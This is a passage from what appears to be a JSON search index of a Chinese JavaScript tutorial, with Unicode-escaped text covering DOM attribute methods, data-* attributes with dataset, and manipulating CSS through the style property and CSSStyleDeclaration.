\u5c5e\u6027\uff0c\u4e5f\u53ef\u4ee5\u7528 getAttribute('data-foo') \u3001 removeAttribute('data-foo') \u3001 setAttribute('data-foo') \u3001 hasAttribute('data-foo') \u7b49\u65b9\u6cd5\u64cd\u4f5c data-* \u5c5e\u6027\u3002 \u6ce8\u610f\uff0c data- \u540e\u9762\u7684\u5c5e\u6027\u540d\u6709\u9650\u5236\uff0c\u53ea\u80fd\u5305\u542b\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u8fde\u8bcd\u7ebf\uff08 - \uff09\u3001\u70b9\uff08 . \uff09\u3001\u5192\u53f7\uff08 : \uff09\u548c\u4e0b\u5212\u7ebf\uff08 _ )\u3002\u800c\u4e14\uff0c\u5c5e\u6027\u540d\u4e0d\u5e94\u8be5\u4f7f\u7528 A \u5230 Z \u7684\u5927\u5199\u5b57\u6bcd\uff0c\u6bd4\u5982\u4e0d\u80fd\u6709 data-helloWorld \u8fd9\u6837\u7684\u5c5e\u6027\u540d\uff0c\u800c\u8981\u5199\u6210 data-hello-world \u3002 \u8f6c\u6210 dataset \u7684\u952e\u540d\u65f6\uff0c\u8fde\u8bcd\u7ebf\u540e\u9762\u5982\u679c\u8ddf\u7740\u4e00\u4e2a\u5c0f\u5199\u5b57\u6bcd\uff0c\u90a3\u4e48\u8fde\u8bcd\u7ebf\u4f1a\u88ab\u79fb\u9664\uff0c\u8be5\u5c0f\u5199\u5b57\u6bcd\u8f6c\u4e3a\u5927\u5199\u5b57\u6bcd\uff0c\u5176\u4ed6\u5b57\u7b26\u4e0d\u53d8\u3002\u53cd\u8fc7\u6765\uff0c dataset \u7684\u952e\u540d\u8f6c\u6210\u5c5e\u6027\u540d\u65f6\uff0c\u6240\u6709\u5927\u5199\u5b57\u6bcd\u90fd\u4f1a\u88ab\u8f6c\u6210\u8fde\u8bcd\u7ebf+\u8be5\u5b57\u6bcd\u7684\u5c0f\u5199\u5f62\u5f0f\uff0c\u5176\u4ed6\u5b57\u7b26\u4e0d\u53d8\u3002\u6bd4\u5982\uff0c dataset.helloWorld \u4f1a\u8f6c\u6210 data-hello-world \u3002","title":"\u5c5e\u6027\u7684\u64cd\u4f5c"},{"location":"dom/attributes/#_1","text":"HTML \u5143\u7d20\u5305\u62ec\u6807\u7b7e\u540d\u548c\u82e5\u5e72\u4e2a\u952e\u503c\u5bf9\uff0c\u8fd9\u4e2a\u952e\u503c\u5bf9\u5c31\u79f0\u4e3a\u201c\u5c5e\u6027\u201d\uff08attribute\uff09\u3002 1 2 3 < a id = \"test\" href = \"http://www.example.com\" > \u94fe\u63a5 </ a > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c a \u5143\u7d20\u5305\u62ec\u4e24\u4e2a\u5c5e\u6027\uff1a id \u5c5e\u6027\u548c href \u5c5e\u6027\u3002 \u5c5e\u6027\u672c\u8eab\u662f\u4e00\u4e2a\u5bf9\u8c61\uff08 Attr \u5bf9\u8c61\uff09\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\uff0c\u8fd9\u4e2a\u5bf9\u8c61\u6781\u5c11\u4f7f\u7528\u3002\u4e00\u822c\u90fd\u662f\u901a\u8fc7\u5143\u7d20\u8282\u70b9\u5bf9\u8c61\uff08 HTMlElement \u5bf9\u8c61\uff09\u6765\u64cd\u4f5c\u5c5e\u6027\u3002\u672c\u7ae0\u4ecb\u7ecd\u5982\u4f55\u64cd\u4f5c\u8fd9\u4e9b\u5c5e\u6027\u3002","title":"\u5c5e\u6027\u7684\u64cd\u4f5c"},{"location":"dom/attributes/#elementattributes","text":"\u5143\u7d20\u5bf9\u8c61\u6709\u4e00\u4e2a attributes \u5c5e\u6027\uff0c\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u52a8\u6001\u5bf9\u8c61\uff0c\u6210\u5458\u662f\u8be5\u5143\u7d20\u6807\u7b7e\u7684\u6240\u6709\u5c5e\u6027\u8282\u70b9\u5bf9\u8c61\uff0c\u5c5e\u6027\u7684\u5b9e\u65f6\u53d8\u5316\u90fd\u4f1a\u53cd\u6620\u5728\u8fd9\u4e2a\u8282\u70b9\u5bf9\u8c61\u4e0a\u3002\u5176\u4ed6\u7c7b\u578b\u7684\u8282\u70b9\u5bf9\u8c61\uff0c\u867d\u7136\u4e5f\u6709 attributes \u5c5e\u6027\uff0c\u4f46\u8fd4\u56de\u7684\u90fd\u662f null \uff0c\u56e0\u6b64\u53ef\u4ee5\u628a\u8fd9\u4e2a\u5c5e\u6027\u89c6\u4e3a\u5143\u7d20\u5bf9\u8c61\u72ec\u6709\u7684\u3002 \u5355\u4e2a\u5c5e\u6027\u53ef\u4ee5\u901a\u8fc7\u5e8f\u53f7\u5f15\u7528\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5c5e\u6027\u540d\u5f15\u7528\u3002 1 2 3 4 5 // HTML \u4ee3\u7801\u5982\u4e0b // <body bgcolor=\"yellow\" onload=\"\"> document . body . attributes [ 0 ] document . body . attributes . bgcolor document . body . attributes [ 'ONLOAD' ] \u6ce8\u610f\uff0c\u4e0a\u9762\u4ee3\u7801\u7684\u4e09\u79cd\u65b9\u6cd5\uff0c\u8fd4\u56de\u7684\u90fd\u662f\u5c5e\u6027\u8282\u70b9\u5bf9\u8c61\uff0c\u800c\u4e0d\u662f\u5c5e\u6027\u503c\u3002 \u5c5e\u6027\u8282\u70b9\u5bf9\u8c61\u6709 name \u548c value \u5c5e\u6027\uff0c\u5bf9\u5e94\u8be5\u5c5e\u6027\u7684\u5c5e\u6027\u540d\u548c\u5c5e\u6027\u503c\uff0c\u7b49\u540c\u4e8e nodeName \u5c5e\u6027\u548c nodeValue \u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 9 // HTML\u4ee3\u7801\u4e3a // <div id=\"mydiv\"> var n = document . getElementById ( 'mydiv' ); n . attributes [ 0 ]. name // \"id\" n . attributes [ 0 ]. nodeName // \"id\" n . attributes [ 0 ]. value // \"mydiv\" n . attributes [ 0 ]. nodeValue // \"mydiv\" \u4e0b\u9762\u4ee3\u7801\u53ef\u4ee5\u904d\u5386\u4e00\u4e2a\u5143\u7d20\u8282\u70b9\u7684\u6240\u6709\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var para = document . getElementsByTagName ( 'p' )[ 0 ]; var result = document . getElementById ( 'result' ); if ( para . hasAttributes ()) { var attrs = para . attributes ; var output = '' ; for ( var i = attrs . length - 1 ; i >= 0 ; i -- ) { output += attrs [ i ]. name + '->' + attrs [ i ]. value ; } result . textContent = output ; } else { result . textContent = 'No attributes to show' ; }","title":"Element.attributes \u5c5e\u6027"},{"location":"dom/attributes/#_2","text":"HTML \u5143\u7d20\u7684\u6807\u51c6\u5c5e\u6027\uff08\u5373\u5728\u6807\u51c6\u4e2d\u5b9a\u4e49\u7684\u5c5e\u6027\uff09\uff0c\u4f1a\u81ea\u52a8\u6210\u4e3a\u5143\u7d20\u8282\u70b9\u5bf9\u8c61\u7684\u5c5e\u6027\u3002 1 2 3 var a = document . getElementById ( 'test' ); a . id // \"test\" a . href // \"http://www.example.com/\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c a \u5143\u7d20\u6807\u7b7e\u7684\u5c5e\u6027 id \u548c href \uff0c\u81ea\u52a8\u6210\u4e3a\u8282\u70b9\u5bf9\u8c61\u7684\u5c5e\u6027\u3002 \u8fd9\u4e9b\u5c5e\u6027\u90fd\u662f\u53ef\u5199\u7684\u3002 1 2 var img = document . getElementById ( 'myImage' ); img . src = 'http://www.example.com/image.jpg' ; \u4e0a\u9762\u7684\u5199\u6cd5\uff0c\u4f1a\u7acb\u523b\u66ff\u6362\u6389 img \u5bf9\u8c61\u7684 src \u5c5e\u6027\uff0c\u5373\u4f1a\u663e\u793a\u53e6\u5916\u4e00\u5f20\u56fe\u7247\u3002 \u8fd9\u79cd\u4fee\u6539\u5c5e\u6027\u7684\u65b9\u6cd5\uff0c\u5e38\u5e38\u7528\u4e8e\u6dfb\u52a0\u8868\u5355\u7684\u5c5e\u6027\u3002 1 2 3 var f = document . forms [ 0 ]; f . action = 'submit.php' ; f . method = 'POST' ; \u4e0a\u9762\u4ee3\u7801\u4e3a\u8868\u5355\u6dfb\u52a0\u63d0\u4ea4\u7f51\u5740\u548c\u63d0\u4ea4\u65b9\u6cd5\u3002 \u6ce8\u610f\uff0c\u8fd9\u79cd\u7528\u6cd5\u867d\u7136\u53ef\u4ee5\u8bfb\u5199\u5c5e\u6027\uff0c\u4f46\u662f\u65e0\u6cd5\u5220\u9664\u5c5e\u6027\uff0c delete \u8fd0\u7b97\u7b26\u5728\u8fd9\u91cc\u4e0d\u4f1a\u751f\u6548\u3002 HTML \u5143\u7d20\u7684\u5c5e\u6027\u540d\u662f\u5927\u5c0f\u5199\u4e0d\u654f\u611f\u7684\uff0c\u4f46\u662f JavaScript \u5bf9\u8c61\u7684\u5c5e\u6027\u540d\u662f\u5927\u5c0f\u5199\u654f\u611f\u7684\u3002\u8f6c\u6362\u89c4\u5219\u662f\uff0c\u8f6c\u4e3a JavaScript \u5c5e\u6027\u540d\u65f6\uff0c\u4e00\u5f8b\u91c7\u7528\u5c0f\u5199\u3002\u5982\u679c\u5c5e\u6027\u540d\u5305\u62ec\u591a\u4e2a\u5355\u8bcd\uff0c\u5219\u91c7\u7528\u9a86\u9a7c\u62fc\u5199\u6cd5\uff0c\u5373\u4ece\u7b2c\u4e8c\u4e2a\u5355\u8bcd\u5f00\u59cb\uff0c\u6bcf\u4e2a\u5355\u8bcd\u7684\u9996\u5b57\u6bcd\u91c7\u7528\u5927\u5199\uff0c\u6bd4\u5982 onClick \u3002 \u6709\u4e9b HTML \u5c5e\u6027\u540d\u662f JavaScript \u7684\u4fdd\u7559\u5b57\uff0c\u8f6c\u4e3a JavaScript \u5c5e\u6027\u65f6\uff0c\u5fc5\u987b\u6539\u540d\u3002\u4e3b\u8981\u662f\u4ee5\u4e0b\u4e24\u4e2a\u3002 for \u5c5e\u6027\u6539\u4e3a htmlFor class \u5c5e\u6027\u6539\u4e3a className \u53e6\u5916\uff0cHTML \u5c5e\u6027\u503c\u4e00\u822c\u90fd\u662f\u5b57\u7b26\u4e32\uff0c\u4f46\u662f JavaScript \u5c5e\u6027\u4f1a\u81ea\u52a8\u8f6c\u6362\u7c7b\u578b\u3002\u6bd4\u5982\uff0c\u5c06\u5b57\u7b26\u4e32 true \u8f6c\u4e3a\u5e03\u5c14\u503c\uff0c\u5c06 onClick \u7684\u503c\u8f6c\u4e3a\u4e00\u4e2a\u51fd\u6570\uff0c\u5c06 style \u5c5e\u6027\u7684\u503c\u8f6c\u4e3a\u4e00\u4e2a CSSStyleDeclaration \u5bf9\u8c61\u3002\u56e0\u6b64\uff0c\u53ef\u4ee5\u5bf9\u8fd9\u4e9b\u5c5e\u6027\u8d4b\u4e88\u5404\u79cd\u7c7b\u578b\u7684\u503c\u3002","title":"\u5143\u7d20\u7684\u6807\u51c6\u5c5e\u6027"},{"location":"dom/attributes/#_3","text":"","title":"\u5c5e\u6027\u64cd\u4f5c\u7684\u6807\u51c6\u65b9\u6cd5"},{"location":"dom/attributes/#_4","text":"\u5143\u7d20\u8282\u70b9\u63d0\u4f9b\u516d\u4e2a\u65b9\u6cd5\uff0c\u7528\u6765\u64cd\u4f5c\u5c5e\u6027\u3002 getAttribute() getAttributeNames() setAttribute() hasAttribute() hasAttributes() removeAttribute() \u8fd9\u6709\u51e0\u70b9\u6ce8\u610f\u3002 \uff081\uff09\u9002\u7528\u6027 \u8fd9\u516d\u4e2a\u65b9\u6cd5\u5bf9\u6240\u6709\u5c5e\u6027\uff08\u5305\u62ec\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u5c5e\u6027\uff09\u90fd\u9002\u7528\u3002 \uff082\uff09\u8fd4\u56de\u503c getAttribute() \u53ea\u8fd4\u56de\u5b57\u7b26\u4e32\uff0c\u4e0d\u4f1a\u8fd4\u56de\u5176\u4ed6\u7c7b\u578b\u7684\u503c\u3002 \uff083\uff09\u5c5e\u6027\u540d \u8fd9\u4e9b\u65b9\u6cd5\u53ea\u63a5\u53d7\u5c5e\u6027\u7684\u6807\u51c6\u540d\u79f0\uff0c\u4e0d\u7528\u6539\u5199\u4fdd\u7559\u5b57\uff0c\u6bd4\u5982 for \u548c class \u90fd\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u3002\u53e6\u5916\uff0c\u8fd9\u4e9b\u65b9\u6cd5\u5bf9\u4e8e\u5c5e\u6027\u540d\u662f\u5927\u5c0f\u5199\u4e0d\u654f\u611f\u7684\u3002 1 2 var image = document . images [ 0 ]; image . setAttribute ( 'class' , 'myImage' ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c setAttribute \u65b9\u6cd5\u76f4\u63a5\u4f7f\u7528 class \u4f5c\u4e3a\u5c5e\u6027\u540d\uff0c\u4e0d\u7528\u5199\u6210 className \u3002","title":"\u6982\u8ff0"},{"location":"dom/attributes/#elementgetattribute","text":"Element.getAttribute \u65b9\u6cd5\u8fd4\u56de\u5f53\u524d\u5143\u7d20\u8282\u70b9\u7684\u6307\u5b9a\u5c5e\u6027\u3002\u5982\u679c\u6307\u5b9a\u5c5e\u6027\u4e0d\u5b58\u5728\uff0c\u5219\u8fd4\u56de null \u3002 1 2 3 4 // HTML \u4ee3\u7801\u4e3a // <div id=\"div1\" align=\"left\"> var div = document . getElementById ( 'div1' ); div . getAttribute ( 'align' ) // \"left\"","title":"Element.getAttribute()"},{"location":"dom/attributes/#elementgetattributenames","text":"Element.getAttributeNames() \u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u6210\u5458\u662f\u5f53\u524d\u5143\u7d20\u7684\u6240\u6709\u5c5e\u6027\u7684\u540d\u5b57\u3002\u5982\u679c\u5f53\u524d\u5143\u7d20\u6ca1\u6709\u4efb\u4f55\u5c5e\u6027\uff0c\u5219\u8fd4\u56de\u4e00\u4e2a\u7a7a\u6570\u7ec4\u3002\u4f7f\u7528 Element.attributes \u5c5e\u6027\uff0c\u4e5f\u53ef\u4ee5\u62ff\u5230\u540c\u6837\u7684\u7ed3\u679c\uff0c\u552f\u4e00\u7684\u533a\u522b\u662f\u5b83\u8fd4\u56de\u7684\u662f\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u3002 1 2 3 4 5 6 var mydiv = document . getElementById ( 'mydiv' ); mydiv . getAttributeNames (). forEach ( function ( key ) { var value = mydiv . getAttribute ( key ); console . log ( key , value ); }) \u4e0a\u9762\u4ee3\u7801\u7528\u4e8e\u904d\u5386\u67d0\u4e2a\u8282\u70b9\u7684\u6240\u6709\u5c5e\u6027\u3002","title":"Element.getAttributeNames()"},{"location":"dom/attributes/#elementsetattribute","text":"Element.setAttribute \u65b9\u6cd5\u7528\u4e8e\u4e3a\u5f53\u524d\u5143\u7d20\u8282\u70b9\u65b0\u589e\u5c5e\u6027\u3002\u5982\u679c\u540c\u540d\u5c5e\u6027\u5df2\u5b58\u5728\uff0c\u5219\u76f8\u5f53\u4e8e\u7f16\u8f91\u5df2\u5b58\u5728\u7684\u5c5e\u6027\u3002\u8be5\u65b9\u6cd5\u6ca1\u6709\u8fd4\u56de\u503c\u3002 1 2 3 4 5 // HTML \u4ee3\u7801\u4e3a // <button>Hello World</button> var b = document . querySelector ( 'button' ); b . setAttribute ( 'name' , 'myButton' ); b . setAttribute ( 'disabled' , true ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c button \u5143\u7d20\u7684 name \u5c5e\u6027\u88ab\u8bbe\u6210 myButton \uff0c disabled \u5c5e\u6027\u88ab\u8bbe\u6210 true \u3002 \u8fd9\u91cc\u6709\u4e24\u4e2a\u5730\u65b9\u9700\u8981\u6ce8\u610f\uff0c\u9996\u5148\uff0c\u5c5e\u6027\u503c\u603b\u662f\u5b57\u7b26\u4e32\uff0c\u5176\u4ed6\u7c7b\u578b\u7684\u503c\u4f1a\u81ea\u52a8\u8f6c\u6210\u5b57\u7b26\u4e32\uff0c\u6bd4\u5982\u5e03\u5c14\u503c true \u5c31\u4f1a\u53d8\u6210\u5b57\u7b26\u4e32 true \uff1b\u5176\u6b21\uff0c\u4e0a\u4f8b\u7684 disable \u5c5e\u6027\u662f\u4e00\u4e2a\u5e03\u5c14\u5c5e\u6027\uff0c\u5bf9\u4e8e <button> \u5143\u7d20\u6765\u8bf4\uff0c\u8fd9\u4e2a\u5c5e\u6027\u4e0d\u9700\u8981\u5c5e\u6027\u503c\uff0c\u53ea\u8981\u8bbe\u7f6e\u4e86\u5c31\u603b\u662f\u4f1a\u751f\u6548\uff0c\u56e0\u6b64 setAttribute \u65b9\u6cd5\u91cc\u9762\u53ef\u4ee5\u5c06 disabled \u5c5e\u6027\u8bbe\u6210\u4efb\u610f\u503c\u3002","title":"Element.setAttribute()"},{"location":"dom/attributes/#elementhasattribute","text":"Element.hasAttribute \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u5143\u7d20\u8282\u70b9\u662f\u5426\u5305\u542b\u6307\u5b9a\u5c5e\u6027\u3002 1 2 3 4 5 var d = document . getElementById ( 'div1' ); if ( d . hasAttribute ( 'align' )) { d . setAttribute ( 'align' , 'center' ); } \u4e0a\u9762\u4ee3\u7801\u68c0\u67e5 div \u8282\u70b9\u662f\u5426\u542b\u6709 align \u5c5e\u6027\u3002\u5982\u679c\u6709\uff0c\u5219\u8bbe\u7f6e\u4e3a\u5c45\u4e2d\u5bf9\u9f50\u3002","title":"Element.hasAttribute()"},{"location":"dom/attributes/#elementhasattributes","text":"Element.hasAttributes \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u5143\u7d20\u662f\u5426\u6709\u5c5e\u6027\uff0c\u5982\u679c\u6ca1\u6709\u4efb\u4f55\u5c5e\u6027\uff0c\u5c31\u8fd4\u56de false \uff0c\u5426\u5219\u8fd4\u56de true \u3002 1 2 var foo = document . getElementById ( 'foo' ); foo . hasAttributes () // true","title":"Element.hasAttributes()"},{"location":"dom/attributes/#elementremoveattribute","text":"Element.removeAttribute \u65b9\u6cd5\u79fb\u9664\u6307\u5b9a\u5c5e\u6027\u3002\u8be5\u65b9\u6cd5\u6ca1\u6709\u8fd4\u56de\u503c\u3002 1 2 3 4 5 // HTML \u4ee3\u7801\u4e3a // <div id=\"div1\" align=\"left\" width=\"200px\"> document . getElementById ( 'div1' ). removeAttribute ( 'align' ); // \u73b0\u5728\u7684HTML\u4ee3\u7801\u4e3a // <div id=\"div1\" width=\"200px\">","title":"Element.removeAttribute()"},{"location":"dom/attributes/#dataset","text":"\u6709\u65f6\uff0c\u9700\u8981\u5728HTML\u5143\u7d20\u4e0a\u9644\u52a0\u6570\u636e\uff0c\u4f9b JavaScript \u811a\u672c\u4f7f\u7528\u3002\u4e00\u79cd\u89e3\u51b3\u65b9\u6cd5\u662f\u81ea\u5b9a\u4e49\u5c5e\u6027\u3002 1 < div id = \"mydiv\" foo = \"bar\" > \u4e0a\u9762\u4ee3\u7801\u4e3a div \u5143\u7d20\u81ea\u5b9a\u4e49\u4e86 foo \u5c5e\u6027\uff0c\u7136\u540e\u53ef\u4ee5\u7528 getAttribute() \u548c setAttribute() \u8bfb\u5199\u8fd9\u4e2a\u5c5e\u6027\u3002 1 2 3 var n = document . getElementById ( 'mydiv' ); n . getAttribute ( 'foo' ) // bar n . setAttribute ( 'foo' , 'baz' ) \u8fd9\u79cd\u65b9\u6cd5\u867d\u7136\u53ef\u4ee5\u8fbe\u5230\u76ee\u7684\uff0c\u4f46\u662f\u4f1a\u4f7f\u5f97 HTML \u5143\u7d20\u7684\u5c5e\u6027\u4e0d\u7b26\u5408\u6807\u51c6\uff0c\u5bfc\u81f4\u7f51\u9875\u4ee3\u7801\u901a\u4e0d\u8fc7\u6821\u9a8c\u3002 \u66f4\u597d\u7684\u89e3\u51b3\u65b9\u6cd5\u662f\uff0c\u4f7f\u7528\u6807\u51c6\u63d0\u4f9b\u7684 data-* \u5c5e\u6027\u3002 1 < div id = \"mydiv\" data-foo = \"bar\" > \u7136\u540e\uff0c\u4f7f\u7528\u5143\u7d20\u8282\u70b9\u5bf9\u8c61\u7684 dataset \u5c5e\u6027\uff0c\u5b83\u6307\u5411\u4e00\u4e2a\u5bf9\u8c61\uff0c\u53ef\u4ee5\u7528\u6765\u64cd\u4f5c HTML \u5143\u7d20\u6807\u7b7e\u7684 data-* \u5c5e\u6027\u3002 1 2 3 var n = document . getElementById ( 'mydiv' ); n . dataset . foo // bar n . dataset . foo = 'baz' \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u901a\u8fc7 dataset.foo \u8bfb\u5199 data-foo \u5c5e\u6027\u3002 \u5220\u9664\u4e00\u4e2a data-* \u5c5e\u6027\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 delete \u547d\u4ee4\u3002 1 delete document . getElementById ( 'myDiv' ). dataset . foo ; \u9664\u4e86 dataset \u5c5e\u6027\uff0c\u4e5f\u53ef\u4ee5\u7528 getAttribute('data-foo') \u3001 removeAttribute('data-foo') \u3001 setAttribute('data-foo') \u3001 hasAttribute('data-foo') \u7b49\u65b9\u6cd5\u64cd\u4f5c data-* \u5c5e\u6027\u3002 \u6ce8\u610f\uff0c data- \u540e\u9762\u7684\u5c5e\u6027\u540d\u6709\u9650\u5236\uff0c\u53ea\u80fd\u5305\u542b\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u8fde\u8bcd\u7ebf\uff08 - \uff09\u3001\u70b9\uff08 . \uff09\u3001\u5192\u53f7\uff08 : \uff09\u548c\u4e0b\u5212\u7ebf\uff08 _ )\u3002\u800c\u4e14\uff0c\u5c5e\u6027\u540d\u4e0d\u5e94\u8be5\u4f7f\u7528 A \u5230 Z \u7684\u5927\u5199\u5b57\u6bcd\uff0c\u6bd4\u5982\u4e0d\u80fd\u6709 data-helloWorld \u8fd9\u6837\u7684\u5c5e\u6027\u540d\uff0c\u800c\u8981\u5199\u6210 data-hello-world \u3002 \u8f6c\u6210 dataset \u7684\u952e\u540d\u65f6\uff0c\u8fde\u8bcd\u7ebf\u540e\u9762\u5982\u679c\u8ddf\u7740\u4e00\u4e2a\u5c0f\u5199\u5b57\u6bcd\uff0c\u90a3\u4e48\u8fde\u8bcd\u7ebf\u4f1a\u88ab\u79fb\u9664\uff0c\u8be5\u5c0f\u5199\u5b57\u6bcd\u8f6c\u4e3a\u5927\u5199\u5b57\u6bcd\uff0c\u5176\u4ed6\u5b57\u7b26\u4e0d\u53d8\u3002\u53cd\u8fc7\u6765\uff0c dataset \u7684\u952e\u540d\u8f6c\u6210\u5c5e\u6027\u540d\u65f6\uff0c\u6240\u6709\u5927\u5199\u5b57\u6bcd\u90fd\u4f1a\u88ab\u8f6c\u6210\u8fde\u8bcd\u7ebf+\u8be5\u5b57\u6bcd\u7684\u5c0f\u5199\u5f62\u5f0f\uff0c\u5176\u4ed6\u5b57\u7b26\u4e0d\u53d8\u3002\u6bd4\u5982\uff0c dataset.helloWorld \u4f1a\u8f6c\u6210 data-hello-world \u3002","title":"dataset \u5c5e\u6027"},{"location":"dom/css/","text":"CSS \u64cd\u4f5c \u00b6 CSS \u4e0e JavaScript \u662f\u4e24\u4e2a\u6709\u7740\u660e\u786e\u5206\u5de5\u7684\u9886\u57df\uff0c\u524d\u8005\u8d1f\u8d23\u9875\u9762\u7684\u89c6\u89c9\u6548\u679c\uff0c\u540e\u8005\u8d1f\u8d23\u4e0e\u7528\u6237\u7684\u884c\u4e3a\u4e92\u52a8\u3002\u4f46\u662f\uff0c\u5b83\u4eec\u6bd5\u7adf\u540c\u5c5e\u7f51\u9875\u5f00\u53d1\u7684\u524d\u7aef\uff0c\u56e0\u6b64\u4e0d\u53ef\u907f\u514d\u6709\u7740\u4ea4\u53c9\u548c\u4e92\u76f8\u914d\u5408\u3002\u672c\u7ae0\u4ecb\u7ecd\u5982\u4f55\u901a\u8fc7 JavaScript \u64cd\u4f5c CSS\u3002 HTML \u5143\u7d20\u7684 style \u5c5e\u6027 \u00b6 \u64cd\u4f5c CSS \u6837\u5f0f\u6700\u7b80\u5355\u7684\u65b9\u6cd5\uff0c\u5c31\u662f\u4f7f\u7528\u7f51\u9875\u5143\u7d20\u8282\u70b9\u7684 getAttribute() \u65b9\u6cd5\u3001 setAttribute() \u65b9\u6cd5\u548c removeAttribute() \u65b9\u6cd5\uff0c\u76f4\u63a5\u8bfb\u5199\u6216\u5220\u9664\u7f51\u9875\u5143\u7d20\u7684 style \u5c5e\u6027\u3002 1 2 3 4 div . setAttribute ( 'style' , 'background-color:red;' + 'border:1px solid black;' ); \u4e0a\u9762\u7684\u4ee3\u7801\u76f8\u5f53\u4e8e\u4e0b\u9762\u7684 HTML \u4ee3\u7801\u3002 1 < div style = \"background-color:red; border:1px solid black;\" /> style \u4e0d\u4ec5\u53ef\u4ee5\u4f7f\u7528\u5b57\u7b26\u4e32\u8bfb\u5199\uff0c\u5b83\u672c\u8eab\u8fd8\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u90e8\u7f72\u4e86 CSSStyleDeclaration \u63a5\u53e3\uff08\u8be6\u89c1\u4e0b\u9762\u7684\u4ecb\u7ecd\uff09\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bfb\u5199\u4e2a\u522b\u5c5e\u6027\u3002 1 2 e . style . fontSize = '18px' ; e . style . color = 'black' ; CSSStyleDeclaration \u63a5\u53e3 \u00b6 \u7b80\u4ecb \u00b6 CSSStyleDeclaration \u63a5\u53e3\u7528\u6765\u64cd\u4f5c\u5143\u7d20\u7684\u6837\u5f0f\u3002\u4e09\u4e2a\u5730\u65b9\u90e8\u7f72\u4e86\u8fd9\u4e2a\u63a5\u53e3\u3002 \u5143\u7d20\u8282\u70b9\u7684 style \u5c5e\u6027\uff08 Element.style \uff09 CSSStyle \u5b9e\u4f8b\u7684 style \u5c5e\u6027 window.getComputedStyle() \u7684\u8fd4\u56de\u503c CSSStyleDeclaration \u63a5\u53e3\u53ef\u4ee5\u76f4\u63a5\u8bfb\u5199 CSS \u7684\u6837\u5f0f\u5c5e\u6027\uff0c\u4e0d\u8fc7\uff0c\u8fde\u8bcd\u53f7\u9700\u8981\u53d8\u6210\u9a86\u9a7c\u62fc\u5199\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var divStyle = document . querySelector ( 'div' ). style ; divStyle . backgroundColor = 'red' ; divStyle . border = '1px solid black' ; divStyle . width = '100px' ; divStyle . height = '100px' ; divStyle . fontSize = '10em' ; divStyle . backgroundColor // red divStyle . border // 1px solid black divStyle . height // 100px divStyle . width // 100px \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c style \u5c5e\u6027\u7684\u503c\u662f\u4e00\u4e2a CSSStyleDeclaration \u5b9e\u4f8b\u3002\u8fd9\u4e2a\u5bf9\u8c61\u6240\u5305\u542b\u7684\u5c5e\u6027\u4e0e CSS \u89c4\u5219\u4e00\u4e00\u5bf9\u5e94\uff0c\u4f46\u662f\u540d\u5b57\u9700\u8981\u6539\u5199\uff0c\u6bd4\u5982 background-color \u5199\u6210 backgroundColor \u3002\u6539\u5199\u7684\u89c4\u5219\u662f\u5c06\u6a2a\u6760\u4ece CSS \u5c5e\u6027\u540d\u4e2d\u53bb\u9664\uff0c\u7136\u540e\u5c06\u6a2a\u6760\u540e\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u5927\u5199\u3002\u5982\u679c CSS \u5c5e\u6027\u540d\u662f JavaScript \u4fdd\u7559\u5b57\uff0c\u5219\u89c4\u5219\u540d\u4e4b\u524d\u9700\u8981\u52a0\u4e0a\u5b57\u7b26\u4e32 css \uff0c\u6bd4\u5982 float \u5199\u6210 cssFloat \u3002 \u6ce8\u610f\uff0c\u8be5\u5bf9\u8c61\u7684\u5c5e\u6027\u503c\u90fd\u662f\u5b57\u7b26\u4e32\uff0c\u8bbe\u7f6e\u65f6\u5fc5\u987b\u5305\u62ec\u5355\u4f4d\uff0c\u4f46\u662f\u4e0d\u542b\u89c4\u5219\u7ed3\u5c3e\u7684\u5206\u53f7\u3002\u6bd4\u5982\uff0c divStyle.width \u4e0d\u80fd\u5199\u4e3a 100 \uff0c\u800c\u8981\u5199\u4e3a 100px \u3002 \u53e6\u5916\uff0c Element.style \u8fd4\u56de\u7684\u53ea\u662f\u884c\u5185\u6837\u5f0f\uff0c\u5e76\u4e0d\u662f\u8be5\u5143\u7d20\u7684\u5168\u90e8\u6837\u5f0f\u3002\u901a\u8fc7\u6837\u5f0f\u8868\u8bbe\u7f6e\u7684\u6837\u5f0f\uff0c\u6216\u8005\u4ece\u7236\u5143\u7d20\u7ee7\u627f\u7684\u6837\u5f0f\uff0c\u65e0\u6cd5\u901a\u8fc7\u8fd9\u4e2a\u5c5e\u6027\u5f97\u5230\u3002\u5143\u7d20\u7684\u5168\u90e8\u6837\u5f0f\u8981\u901a\u8fc7 window.getComputedStyle() \u5f97\u5230\u3002 CSSStyleDeclaration \u5b9e\u4f8b\u5c5e\u6027 \u00b6 \uff081\uff09CSSStyleDeclaration.cssText CSSStyleDeclaration.cssText \u5c5e\u6027\u7528\u6765\u8bfb\u5199\u5f53\u524d\u89c4\u5219\u7684\u6240\u6709\u6837\u5f0f\u58f0\u660e\u6587\u672c\u3002 1 2 3 4 5 6 var divStyle = document . querySelector ( 'div' ). style ; divStyle . cssText = 'background-color: red;' + 'border: 1px solid black;' + 'height: 100px;' + 'width: 100px;' ; \u6ce8\u610f\uff0c cssText 